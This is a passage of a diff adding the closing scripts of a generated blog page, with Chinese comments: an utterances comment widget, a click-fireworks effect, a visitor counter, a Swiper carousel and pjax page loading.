+    if ($(comment_el).length) {
+      // 匿名函数，防止污染全局变量
+      const HEAD = check_utterance();
+
+      var utterances = document.createElement('script');
+      utterances.type = 'text/javascript';
+      utterances.async = true;
+      utterances.setAttribute('issue-term', 'pathname')
+      utterances.setAttribute('theme', utteranceComment.Theme)
+      utterances.setAttribute('repo', '')
+      utterances.crossorigin = 'anonymous';
+      utterances.src = 'https://utteranc.es/client.js';
+      // content 是要插入评论的地方
+      document.getElementById('gitment-container').appendChild(utterances);
+
+    }
+  }
+
+  function dark_utterance() {
+    const HEAD = check_utterance();
+    if (!HEAD) return;
+    const message = {
+      type: 'set-theme',
+      theme: utteranceComment.Theme
+    };
+    const utteranceIframe = document.querySelector('iframe');
+    utteranceIframe.contentWindow.postMessage(message, 'https://utteranc.es');
+  }
+
+  $(document).ready(load_utterance);
+  document.addEventListener('pjax:complete', function () {
+    load_utterance();
+  });
+
+  $('.dark').click(function () {
+    setTimeout(() => {
+      dark_utterance();
+    });
+  })
+
+</script>
+
+<style>
+  .utterances {
+    max-width: inherit !important;
+  }
+</style>
+      
+
+
+<!-- 鼠标点击特效 -->
+<!-- 爱心点击 -->
+
+  
+    <canvas class="fireworks" style="position: fixed;left: 0;top: 0;z-index: 999; pointer-events: none;" ></canvas>
+    <script async src="//cdn.bootcss.com/animejs/2.2.0/anime.min.js"></script>
+    <script async src="/js/cursor/explosion.min.js"></script>
+  
+
+
+
+
+  <script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" data-pjax></script>
+
+
+<!-- 轮播图标签 -->
+<script>
+  var bambooSwiperTag = {};
+  function load_swiper() {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    loadCSS("https://unpkg.com/swiper@6/swiper-bundle.min.css")
+    loadScript("https://unpkg.com/swiper@6/swiper-bundle.min.js").then(() => {
+      pjax_swiper();
+    });
+  }
+
+  load_swiper();
+
+  function pjax_swiper() {
+    bambooSwiperTag.swiper = new Swiper('.post-swiper-container', {
+      slidesPerView: 'auto',
+      spaceBetween: 8,
+      centeredSlides: true,
+      loop: true,
+      autoplay: true ? {
+        delay: 3000,
+        stopOnLastSlide: false,
+        disableOnInteraction: false,
+      } : false,
+      pagination: {
+        el: '.swiper-pagination',
+        clickable: true,
+      },
+      navigation: {
+        nextEl: '.swiper-button-next',
+        prevEl: '.swiper-button-prev',
+      },
+      on:{
+        init: function(){
+          swiperAnimateCache(this); //隐藏动画元素 
+          swiperAnimate(this); //初始化完成开始动画
+        }, 
+        slideChangeTransitionEnd: function(){ 
+          swiperAnimate(this); //每个slide切换结束时也运行当前slide动画
+          //this.slides.eq(this.activeIndex).find('.ani').removeClass('ani'); 动画只展现一次，去除ani类名
+        } 
+      }
+    });
+  }
+
+  document.addEventListener('pjax:complete', function () {
+    if (!document.querySelectorAll(".post-swiper-container")[0]) return;
+    if (typeof bambooSwiperTag.swiper === "undefined") {
+      load_swiper();
+    } else {
+      pjax_swiper();
+    }
+  });
+</script>
+    <!-- pjax -->
+    
+
+<!-- pjax -->
+
+
+  <script src="/js/pjax@0.2.8/index.js"></script>
+  
+    <div class="pjax-animate">
+  
+    <div class="loading-circle"><div id="loader-circle"></div></div>
+    <script>
+      window.ShowLoading = function() {
+        $(".loading-circle").css("display", "block");
+      };
+      window.HideLoading = function() {
+        $(".loading-circle").css("display", "none");
+      }
+    </script>
+  
+	<script>
+    document.addEventListener('pjax:complete', function () {
+      window.HideLoading();
+    })
+    document.addEventListener('pjax:send', function () {
+      window.ShowLoading();
+    })
+    document.addEventListener('pjax:error', function () {
+      window.HideLoading();
+    })
+	</script>
+</div>
+
+  
+
+  <script>
+    var pjax = new Pjax({
+      elements: 'a[href]:not([href^="#"]):not([href="javascript:void(0)"]):not([no-pjax])',   // 拦截正常带链接的 a 标签
+      selectors: ["#pjax-container","title"],                                   // 根据实际需要确认重载区域
+      cacheBust: false,   // url 地址追加时间戳，用以避免浏览器缓存
+      timeout: 5000
+    });
+
+    document.addEventListener('pjax:send', function (e) {
+
+      try {
+        var currentUrl = window.location.pathname;
+        var targetUrl = e.triggerElement.href;
+        var banUrl = [""];
+        if (banUrl[0] != "") {
+          banUrl.forEach(item => {
+            if(currentUrl.indexOf(item) != -1 || targetUrl.indexOf(item) != -1) {
+              window.location.href = targetUrl;
+            }
+          });
+        }
+      } catch (error) {}
+
+      $(window).unbind('resize');
+      $(window).unbind('scroll');
+      $(document).unbind('scroll');
+      $(document).unbind('click');
+      $('body').unbind('click');
+
+    })
+    
+    document.addEventListener('pjax:complete', function () {
+      $('script[data-pjax], .pjax-reload script').each(function () {
+        $(this).parent().append($(this).remove());
+      });
+    });
+
+    document.addEventListener('pjax:error', function (e) {
+      window.location.href = e.triggerElement.href;
+    })
+    
+    // 刷新不从顶部开始
+    document.addEventListener("DOMContentLoaded", function () {
+      history.scrollRestoration = 'auto';
+    })
+  </script>
+
+
+
+  </body>
+</html>
